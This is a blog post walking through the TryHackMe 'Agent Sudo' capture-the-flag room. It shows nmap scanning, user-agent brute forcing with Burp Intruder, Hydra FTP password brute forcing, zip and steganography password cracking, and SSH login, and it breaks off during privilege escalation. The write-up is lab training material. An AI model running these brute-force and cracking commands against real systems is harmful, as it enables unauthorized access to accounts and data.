<!doctype html>
<html lang="en-us">
  <head>
    <title>Agent Sudo // Antonio Ortiz</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.109.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Antonio Ortiz" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.461905bb1bfb5fe5b9233c724db5019724929afac3efc14c6b267a4f4a8c5c9a.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Agent Sudo"/>
<meta name="twitter:description" content="Agent Sudo You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
Agent Sudo, a CTF room with an alien theme!
As always, we&rsquo;ll start with adding the target machine&rsquo;s IP address to our hosts file.
echo target-ip agentsudo.thm &gt;&gt; /etc/hosts Now lets move on to the room&rsquo;s tasks.
Enumerate We&rsquo;ll start by running an nmap scan of the target."/>

    <meta property="og:title" content="Agent Sudo" />
<meta property="og:description" content="Agent Sudo You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
Agent Sudo, a CTF room with an alien theme!
As always, we&rsquo;ll start with adding the target machine&rsquo;s IP address to our hosts file.
echo target-ip agentsudo.thm &gt;&gt; /etc/hosts Now lets move on to the room&rsquo;s tasks.
Enumerate We&rsquo;ll start by running an nmap scan of the target." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://kaycalbee.github.io/writeups/agentsudo/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2023-01-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-01-03T00:00:00+00:00" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://kaycalbee.github.io/"><img class="app-header-avatar" src="/me1.jpg" alt="Antonio Ortiz" /></a>
      <span class="app-header-title">Antonio Ortiz</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/about">About</a>
            -
          
          <a class="app-header-menu-item" href="/posts/">Blog</a>
            -
          
          <a class="app-header-menu-item" href="/music/">Music</a>
            -
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
            -
          
          <a class="app-header-menu-item" href="/writeups/">Writeups</a>
      </nav>
      <p>Musician // Cyber Security Enthusiast // Designer</p>
      <div class="app-header-social">
        
          <a href="https://github.com/KayCalBee" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://www.linkedin.com/in/ADOrtiz95" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>Linkedin</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Agent Sudo</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jan 3, 2023
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          8 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://kaycalbee.github.io/tags/tryhackme/">tryhackme</a>
              <a class="tag" href="https://kaycalbee.github.io/tags/ctf/">CTF</a>
              <a class="tag" href="https://kaycalbee.github.io/tags/writeup/">Writeup</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="agent-sudo">Agent Sudo</h1>
<figure><img src="/agentsudo/agents.png" width="240px" height="240px"/><figcaption>
            <p>You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.</p>
        </figcaption>
</figure>

<hr>
<p><a href="http://tryhackme.com/room/agentsudoctf">Agent Sudo</a>, a CTF room with an alien theme!</p>
<p>As always, we&rsquo;ll start with adding the target machine&rsquo;s IP address to our hosts file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo target-ip agentsudo.thm &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Now lets move on to the room&rsquo;s tasks.</p>
<hr>
<h3 id="enumerate">Enumerate</h3>
<p>We&rsquo;ll start by running an nmap scan of the target.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -T4 agentsudo.thm
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-01-03 21:01 EST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> agentsudo.thm <span style="color:#f92672">(</span>10.10.249.186<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> ef1f5d04d47795066072ecf058f2cc07 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5e02d19ac4e7430662c19e25848ae7ea <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 2d005cb9fda8c8d880e3924f8b4f18e2 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Annoucement
</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.17 seconds
</span></span></code></pre></div><p>That&rsquo;ll give us the answer to the first question:</p>
<blockquote>
<p>&ldquo;How many open ports?&rdquo;<br>
<em>3</em>.</p>
</blockquote>
<p>We see there&rsquo;s an Apache instance on port 80, so let&rsquo;s check out the webpage.</p>
<figure><a href="/agentsudo/ashome.png"><img src="/agentsudo/ashome.png"/></a><figcaption>
            <p>agentsudo.thm</p>
        </figcaption>
</figure>

<p>Now we have the answer for the second question:</p>
<blockquote>
<p>&ldquo;How you redirect yourself to a secret page?&rdquo;<br>
<em>user-agent</em>.</p>
</blockquote>
<p>Unfortunately I&rsquo;m using Firefox, and switching user-agents on Firefox is a big pain so I&rsquo;ll be using Burpsuite.</p>
<p>To do this we&rsquo;ll open Burp Proxy and intercept the connection to the homepage.<br>
We&rsquo;ll also change the &ldquo;User-Agent&rdquo; field to the provided codename from the homepage before forwarding the connection.</p>
<figure><a href="/agentsudo/brpprxy.png"><img src="/agentsudo/brpprxy.png"/></a><figcaption>
            <p>Burp Proxy Page</p>
        </figcaption>
</figure>

<figure><a href="/agentsudo/alert.png"><img src="/agentsudo/alert.png"/></a><figcaption>
            <p>Alert!</p>
        </figcaption>
</figure>

<p>Pay close attention to the header text, specifically the second sentence:</p>
<blockquote>
<p>Are you one of the <em><strong>25</strong></em> employees?</p>
</blockquote>
<p>It&rsquo;s possible the agent codenames may all be different letters, so we&rsquo;ll test that next.<br>
To do this I&rsquo;ll be running an instance of Burp Intruder set to Sniper, with a list of all the letters in the alphabet (minus &ldquo;R&rdquo;) as the payload. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<figure><a href="/agentsudo/intruder.png"><img src="/agentsudo/intruder.png"/></a><figcaption>
            <p>Intruder</p>
        </figcaption>
</figure>

<figure><a href="/agentsudo/payloadlist.png"><img src="/agentsudo/payloadlist.png"/></a><figcaption>
            <p>Payload</p>
        </figcaption>
</figure>

<p>After starting the attack we&rsquo;ll see that the letter &ldquo;C&rdquo; sends a redirect flag.</p>
<figure><a href="/agentsudo/results.png"><img src="/agentsudo/results.png"/></a><figcaption>
            <p>Results</p>
        </figcaption>
</figure>

<p>By forwarding that request through the proxy we&rsquo;ll then be met with this page:</p>
<figure><a href="/agentsudo/attention.png"><img src="/agentsudo/attention.png"/></a><figcaption>
            <p>Agent C</p>
        </figcaption>
</figure>

<p>Which will answer the third question:</p>
<blockquote>
<p>What is the agent name?<br>
<em>chris</em>.</p>
</blockquote>
<hr>
<h3 id="hash-cracking-and-brute-force">Hash Cracking and Brute-Force</h3>
<p>Now that we have a prospective username we can move on to cracking his ftp password.<br>
We&rsquo;ll use Hydra and the rockyou list to do this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agentsudo.thm
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Hydra v9.4 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2023-01-03 22:10:29
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ftp://agentsudo.thm:21/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21<span style="color:#f92672">][</span>ftp<span style="color:#f92672">]</span> host: agentsudo.thm   login: chris   password: *******
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2023-01-03 22:11:28
</span></span></code></pre></div><blockquote>
<p>FTP password<br>
<code>*******</code></p>
</blockquote>
<p>Now that we have agent C&rsquo;s ftp password we&rsquo;ll login to his account and see if there&rsquo;s anything interesting on the ftp server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp://chris:*******@agentsudo.thm
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Connected to agentsudo.thm.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Please specify the password.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
</span></span><span style="display:flex;"><span>Remote system type is UNIX.
</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> Switching to Binary mode.
</span></span><span style="display:flex;"><span>ftp&gt; ls
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|33502|<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">217</span> Oct <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2019</span> To_agentJ.txt
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">33143</span> Oct <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2019</span> cute-alien.jpg
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">34842</span> Oct <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2019</span> cutie.png
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
</span></span></code></pre></div><p>There&rsquo;s a few different files here, we&rsquo;ll download all of them and take a look.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; mget *
</span></span><span style="display:flex;"><span>mget To_agentJ.txt <span style="color:#f92672">[</span>anpqy?<span style="color:#f92672">]</span>? a
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Prompting off <span style="color:#66d9ef">for</span> duration of mget.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|54940|<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> To_agentJ.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">217</span> bytes<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>100% |*********************************|   <span style="color:#ae81ff">217</span>      311.63 KiB/s    00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">217</span> bytes received in 00:00 <span style="color:#f92672">(</span>1.05 KiB/s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|7350|<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> cute-alien.jpg <span style="color:#f92672">(</span><span style="color:#ae81ff">33143</span> bytes<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>100% |*********************************| <span style="color:#ae81ff">33143</span>      160.33 KiB/s    00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">33143</span> bytes received in 00:00 <span style="color:#f92672">(</span>80.84 KiB/s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|42680|<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> cutie.png <span style="color:#f92672">(</span><span style="color:#ae81ff">34842</span> bytes<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>100% |*********************************| <span style="color:#ae81ff">34842</span>      167.63 KiB/s    00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34842</span> bytes received in 00:00 <span style="color:#f92672">(</span>84.88 KiB/s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ftp&gt; bye
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span> Goodbye.
</span></span></code></pre></div><p>And we&rsquo;ll start with the the .txt file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat To_agentJ.txt
</span></span></code></pre></div><pre tabindex="0"><code>Dear agent J,

All these alien like photos are fake! 
Agent R stored the real picture inside your directory. 
Your login password is somehow stored in the fake picture. 
It shouldn&#39;t be a problem for you.

From,
Agent C
</code></pre><p>Agent C says the password is stored inside the fake picture, so we&rsquo;ll use binwalk to extract (-e) any hidden files.<br>
He doesn&rsquo;t specify which one, so we&rsquo;ll pass both of them to the tool.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e cute-alien.jpg cutie.png
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Scan Time:     2023-01-03 22:27:08
</span></span><span style="display:flex;"><span>Target File:   /home/kali/Downloads/cute-alien.jpg
</span></span><span style="display:flex;"><span>MD5 Checksum:  502df001346ac293b2d2cb4eeb5c57cc
</span></span><span style="display:flex;"><span>Signatures:    <span style="color:#ae81ff">411</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>             0x0             JPEG image data, JFIF standard 1.01
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Scan Time:     2023-01-03 22:27:08
</span></span><span style="display:flex;"><span>Target File:   /home/kali/Downloads/cutie.png
</span></span><span style="display:flex;"><span>MD5 Checksum:  7d0590aebd5dbcfe440c185160c73c9e
</span></span><span style="display:flex;"><span>Signatures:    <span style="color:#ae81ff">411</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>             0x0             PNG image, <span style="color:#ae81ff">528</span> x 528, 8-bit colormap, non-interlaced
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">869</span>           0x365           Zlib compressed data, best compression
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WARNING: Extractor.execute failed to run external extractor <span style="color:#e6db74">&#39;jar xvf &#39;</span>%e<span style="color:#e6db74">&#39;&#39;</span>: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Errno 2<span style="color:#f92672">]</span> No such file or directory: <span style="color:#e6db74">&#39;jar&#39;</span>, <span style="color:#e6db74">&#39;jar xvf &#39;</span>%e<span style="color:#e6db74">&#39;&#39;</span> might not be installed correctly
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34562</span>         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34820</span>         0x8804          End of Zip archive, footer length: <span style="color:#ae81ff">22</span>
</span></span></code></pre></div><p>There&rsquo;s nothing in the first one, but the &ldquo;cutie.png&rdquo; file seems to be hiding a password locked zip file!
To crack it, we&rsquo;ll use John the Ripper and its companion, zip2john.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john 8702.zip &gt;&gt; hash.txt
</span></span></code></pre></div><p>First, zip2john will extract the file&rsquo;s hash to &lsquo;hash.txt&rsquo;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john hash.txt --format<span style="color:#f92672">=</span>ZIP --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p>Then, we&rsquo;ll call john with the ZIP format and use the rockyou list to crack the hash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>ZIP, WinZip <span style="color:#f92672">[</span>PBKDF2-SHA1 256/256 AVX2 8x<span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>HMAC size<span style="color:#f92672">)</span> is <span style="color:#ae81ff">78</span> <span style="color:#66d9ef">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
</span></span><span style="display:flex;"><span>*****            <span style="color:#f92672">(</span>8702.zip/To_agentR.txt<span style="color:#f92672">)</span>     
</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2023-01-03 23:07<span style="color:#f92672">)</span> 4.347g/s 106852p/s 106852c/s 106852C/s christal..280789
</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span>Session completed.
</span></span></code></pre></div><p>After a few seconds we should have our password.</p>
<blockquote>
<p>ZIP file password<br>
<code>*****</code></p>
</blockquote>
<p>Now we can extract and read the hidden text file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat To_agentR.txt
</span></span></code></pre></div><pre tabindex="0"><code>Agent C,

We need to send the picture to &#39;QXJlYTUx&#39; as soon as possible!

By,
Agent R
</code></pre><p>More secrets, it seems Agent R base64 encoded the steg password, so we&rsquo;ll decode it with the following command</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;QXJlYTUx&#34;</span> | base64 -d
</span></span></code></pre></div><blockquote>
<p>steg password<br>
<code>******</code></p>
</blockquote>
<p>We&rsquo;ll then use that password to extract the hidden message in &lsquo;cute-alien.jpg&rsquo; with steghide, a program used to hide data in jpgs and other file types.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>steghide extract -p ****** -sf cute-alien.jpg
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wrote extracted data to <span style="color:#e6db74">&#34;message.txt&#34;</span>.
</span></span></code></pre></div><p>Once we read this text file, we&rsquo;ll finally have found Agent J&rsquo;s password.</p>
<pre tabindex="0"><code>Hi james,

Glad you find this message. Your login password is ************

Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
</code></pre><hr>
<h3 id="capture-the-user-flag">Capture the user flag</h3>
<p>To find the user flag first we&rsquo;re going to ssh into the machine as james.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh james@agentsudo.thm
</span></span></code></pre></div><p>Once we&rsquo;re logged in we can list the files in the current directory, which is where we&rsquo;ll find the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user_flag.txt
</span></span></code></pre></div><blockquote>
<p>What is the user flag?<br>
<code>********************************</code></p>
</blockquote>
<p>Then we&rsquo;ll log out of (or suspend) the connection so we can download the other file to our local machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp james@agentsudo.thm:Alien_autospy.jpg incident.jpg
</span></span></code></pre></div><figure><a href="/agentsudo/incident.jpg"><img src="/agentsudo/incident.jpg"/></a><figcaption>
            <p>Spooky!</p>
        </figcaption>
</figure>

<p>This is a pretty famous picture, and a quick reverse Google search will provide us with the &rsquo;name&rsquo; of the incident in the photo.</p>
<blockquote>
<p>What is the incident of the photo called?<br>
<em>Roswell alien autopsy</em>.</p>
</blockquote>
<hr>
<h3 id="privilege-escalation">Privilege escalation</h3>
<p>Now that we have the user flag we can get started on finding the root flag.
First we&rsquo;ll check james&rsquo; sudo privileges.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> james on agent-sudo:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
